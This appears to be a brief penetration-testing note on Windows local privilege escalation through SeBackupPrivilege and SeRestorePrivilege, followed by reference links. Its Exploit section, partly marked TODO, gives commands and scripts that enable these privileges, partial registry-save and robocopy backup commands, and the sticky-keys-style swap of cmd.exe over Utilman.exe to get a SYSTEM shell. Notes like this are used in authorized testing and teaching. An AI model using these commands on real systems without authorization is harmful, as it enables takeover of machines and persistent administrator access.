# Living off the Land

## 01 - Detect

Look for `SeBackupPrivilege` and `SeRestorePrivilege` enabled in the current local username account.

```
C:\> whoami /priv
```

## 02 - Exploit

TODO: Fill this info

```
C:\> reg save

C:\> robocopy /b
```

```
PS C:\> .\Set-TokenPrivilege.ps1 -privilege SeBackupPrivilege <pid>
```

```
PS C:\> Import-Module .\EnableSeRestorePrivilege.ps1

PS C:\> Enable-SeRestorePrivilege
```


```
PS C:\> copy C:\Windows\System32\Utilman.exe C:\Windows\System32\Utilman.bkp

PS C:\> copy C:\Windows\System32\cmd.exe C:\Windows\System32\Utilman.exe
```

---
## References

### Github

- [gtworek: Priv2Admin](https://github.com/gtworek/Priv2Admin)

- [gtworek: EnableSeRestorePrivilege](https://github.com/gtworek/PSBits/blob/master/Misc/EnableSeRestorePrivilege.ps1)

### Hacktricks

- [Hacktricks: Abusing Tokens](https://book.hacktricks.wiki/en/windows-hardening/windows-local-privilege-escalation/privilege-escalation-abusing-tokens.html)

### Internal All The Things

- [Internal All The Things: Windows Privilege Escalation](https://swisskyrepo.github.io/InternalAllTheThings/redteam/escalation/windows-privilege-escalation/)

### Kojiroh

- [Kojiroh: How to Enable SeBackupPrivilege and SeRestorePrivilege](https://kojiroh.wordpress.com/2020/12/15/how-to-enable-sebackupprivilege-and-serestoreprivilege/)

### Lee Holmes

- [Lee Holmes: Adjusting Token Privileges in PowerShell](https://www.leeholmes.com/adjusting-token-privileges-in-powershell/)